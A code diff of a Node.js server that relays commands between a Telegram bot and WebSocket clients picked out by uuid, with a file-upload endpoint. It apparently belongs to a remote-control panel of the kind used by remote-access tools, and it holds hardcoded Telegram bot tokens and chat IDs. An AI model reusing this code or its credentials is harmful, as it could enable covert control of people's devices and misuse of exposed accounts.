@@ -11,13 +11,13 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '385129421'
-const token = '514364323:AAGfhzOPVFRjTaGrEW9qBYgyafPbipI'
+const chatId = '153159836'
+const token = '517006333:AAHvf1KL7lXMcS6p57qbCrnsnM'
 const bot = new TelegramBot(token, {polling: true});
 
 // request -------------------------------------------------------------------
 app.get("/", (req, res) => {
-    res.send('<h1 style="text-align:center;">S‌erver uploaded suc‌ces‌sfully</h1>')
+    res.send('<h1 style="text-align:center;">Server uploaded successfully, start robot!</h1>')
 })
 app.post("/sendFile", upload.single('file'), (req, res) => {
     var name = req.file.originalname
@@ -105,7 +105,7 @@ bot.on("message", (msg) => {
     }
     if (msg.reply_to_message) {
         if (msg.reply_to_message.text.split('&')[0] === 'ss'){
-            const data = msg.reply_to_message.text.split(']')[0].split("[")[1]
+            const data = msg.text.split(']')[0].split("[")[1]
             const uuid = msg.reply_to_message.text.split('!')[0].split('&')[1]
             wss.clients.forEach(client=>{
                 if (client.uuid === uuid) {
